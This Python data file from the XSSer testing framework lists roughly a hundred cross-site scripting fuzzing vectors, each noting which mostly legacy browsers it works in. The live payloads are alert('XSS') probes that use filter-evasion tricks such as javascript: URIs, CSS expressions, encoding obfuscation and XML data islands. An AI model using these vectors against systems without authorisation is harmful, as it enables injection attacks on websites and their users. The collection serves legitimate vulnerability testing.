"""
$Id$

This file is part of the xsser project, http://xsser.sourceforge.net.

Copyright (c) 2010 psy <root@lordepsylon.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

## XXSer.py @@ fuzzing vectors @@ psy
#
## This file contains different XSS fuzzing vectors to inject in payloads and browser supports.
## If you have some new vectors, please email me to [root@lordepsylon.net] and i will add your list to XSSer framework.
## After, all people who wants to update the tool only will need to do: (python XSser.py --update)
## Thats all.
###
## Happy Cross Hacking! ;)

vectors = [
		
		{ 'payload':"""<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS");>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':""""><img src=x onerror=alert(XSS);>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},		
	
		{ 'payload':"""'';!--"<XSS>=&{()}" """,
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},	

		{ 'payload':"""<IMG SRC="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<IMG SRC=javascript:alert('XSS')>""",
  		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
		
		{ 'payload':"""<IMG SRC=JaVaScRiPt:alert('XSS')>""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<IMG SRC=javascript:alert(&quot;XSS&quot;)>""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<IMG SRC=`javascript:alert("'XSS'")`>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		
		{ 'payload':'<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<IMG SRC="jav   ascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
		#10#
		{ 'payload':"""<IMG SRC="jav&#x09;ascript:alert('XSS');">""",
  		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""}, 
		
		{ 'payload':"""<IMG SRC="jav&#x0A;ascript:alert('XSS');">""",
  		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""}, 

		{ 'payload':"""<IMG SRC="jav&#x0D;ascript:alert('XSS');">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		#{ 'payload':"""<IMG\nSRC\n=\n"\nj\na\nv\na\ns\nc\nr\ni\np\nt\n:\n"""+
		#      """a\nl\ne\nr\nt\n(\n'\n"""+
		#      """X\nS\nS\n'\n"""+
		#      """)\n"\n>""",
		#  'browser':"""[|IE6.0|NS8.1-IE] [O9.02]"""},

		#{ 'payload':"""perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out""",
  		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
		
		{ 'payload':"""<IMG SRC=" &#14;  javascript:alert('XSS');">""",
	          'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<DIV STYLE="behaviour: url(javascript:alert('XSS'));">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

                { 'payload':"""<<SCRIPT>alert("XSS");//<</SCRIPT>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""\";alert('XSS');//""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<IMG SRC='javascript:alert('XSS')'""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
		#20#
                { 'payload':"""<SCRIPT>alert(/XSS/.source)</SCRIPT>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<BODY BACKGROUND="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

                { 'payload':"""</TITLE><SCRIPT>alert("XSS");</SCRIPT>""",
	          'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

                { 'payload':"""<BODY ONLOAD=alert('XSS');>""",
	          'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<IMG DYNSRC="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<IMG LOWSRC="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<BGSOUND SRC="javascript:alert('XSS');">""",
	          'browser':"""[O9.02]"""},

                { 'payload':"""<BR SIZE="&{alert('XSS')}">""",
		  'browser':"""[NS4]"""},

		{ 'payload':"""<LINK REL="stylesheet" HREF="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
		#30##
		{ 'payload':"""<IMG SRC='vbscript:msgbox("XSS");'>""",
	   	  'browser':"""[IE6.0|NS8.1-IE]"""},
	 
		{ 'payload':"""<IMG SRC="mocha:[XSS]">""",
	   	  'browser':"""[NS4]"""},

	 	{ 'payload':"""<IMG SRC="livescript:[XSS]">""",
	  	  'browser':"""[NS4]"""},

	 	{ 'payload':"""<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">""",
	   	  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

	 	{ 'payload':"""<TABLE BACKGROUND="javascript:alert('XSS');">""",
	          'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<TABLE><TD BACKGROUND="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<DIV STYLE="background-image: url(javascript:alert('XSS'));">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},			  
		
		{ 'payload':"""<DIV STYLE="width: expression(alert('XSS'));">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},			  
		#40#
		{ 'payload':"""<IFRAME SRC="javascript:alert('XSS');"></IFRAME>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

   		{ 'payload':"""<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<TABLE BACKGROUND="javascript:alert('XSS')">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
	
		{ 'payload':"""<TABLE><TD BACKGROUND="javascript:alert('XSS')">""",
  		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""}, 			  
		
		{ 'payload':"""<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

   		{ 'payload':"""<DIV STYLE="width: expression(alert('XSS'));">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
		
		{ 'payload':"""<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
	
		{ 'payload':"""<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">""",
  		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""}, 
		
		{ 'payload':"""<XSS STYLE="xss:expression(alert('XSS'))">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},			  
		
		#{ 'payload':"""exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>""",
		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
		#50#
   		{ 'payload':"""<STYLE TYPE="text/javascript">alert('XSS');</STYLE>""",
		  'browser':"""[NS4]"""},

		{ 'payload':"""<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
	
		{ 'payload':"""<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>""",
  		  'browser':"""[IE6.0|NS8.1-IE]"""}, 		  
		
		{ 'payload':"""<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},

   		{ 'payload':"""<BASE HREF="javascript:alert('XSS');//">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>""",
		  'browser':"""[O9.02]"""},
	
		{ 'payload':"""a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);""",
  		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""}, 		  
		
		{ 'payload':"""<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X><xml><SPAN DATASRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		
		{ 'payload':"""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		#60#
		{ 'payload':"""<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",
  		  'browser':"""[IE6.0|NS8.1-IE]"""}, 

		{ 'payload':"""<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
	
		{ 'payload':"""<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>""",
  		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""}, 		  
		
		{ 'payload':"""<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},	 

		{ 'payload':"""<SCRIPT SRC=http://127.0.0.1></SCRIPT>""", 
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

	        #{ 'payload':"""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>""",
		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
		
		#{ 'payload':"""//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>""",
		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		#{ 'payload':"""<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>""",
		#  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		#{ 'payload':"""<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>""",
		#  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
		#70
		#{ 'payload':"""<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>""",
		# 'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		#{ 'payload':"""<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>""",
		# 'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""}, 

		#{ 'payload':"""<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">""",
		#  'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<IMG SRC="&14;javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
	
		{ 'payload':"""<SCRIPT <B>=alert('XSS');"></SCRIPT>""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},	 

		{ 'payload':"""<IFRAME SRC="javascript:alert('XSS'); <""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<SCRIPT>a=/XSS/nalert('XSS');</SCRIPT>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<LAYER SRC="javascript:alert('XSS');></LAYER>""",
		  'browser':"""[NS4]"""},
	
		{ 'payload':"""<STYLE>li {list-style-image: url("javascript:alert('XSS');</STYLE><UL><LI>XSS""", 
		  'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'));">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		#80
		{ 'payload':"""<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-""",
		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<a href="javascript#alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<div onmouseover="alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<input type="image" dynsrc="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""&<script>alert('XSS');</script>">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""&{alert('XSS');};""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<IMG SRC=&{alert('XSS');};>""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<a href="about:<script>alert('XSS');</script>">""",
		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""<DIV STYLE="binding: url(javascript:alert('XSS'));">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<OBJECT classid=clsid:..." codebase="javascript:alert('XSS');">""",
		  'browser':"""[O9.02]"""},

		{ 'payload':"""<style><!--</style><script>alert('XSS');//--></script>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		#90
		{ 'payload':"""![CDATA[<!--]]<script>alert('XSS');//--></script>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<!-- -- --><script>alert('XSS');</script><!-- -- -->""",
		  'browser':"""[Not Info]"""},

		{ 'payload':"""<img src="blah"onmouseover="alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<img src="blah>"onmouseover="alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
		
		{ 'payload':"""<xml id="X"><a><b><script>alert('XSS');</script>;<b></a></xml>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

		{ 'payload':"""<div datafld="b" dataformatas="html" datasrc="#XSS"></div>""",
		  'browser':"""[Not Info]"""},

		{ 'payload':"""[\xC0][\xBC]script>alert('XSS');[\xC0][\xBC]/script>""",
		  'browser':"""[Not Info]"""},	

		{ 'payload':"""<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:alert('XSS');">]]</C><X></xml>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},

]
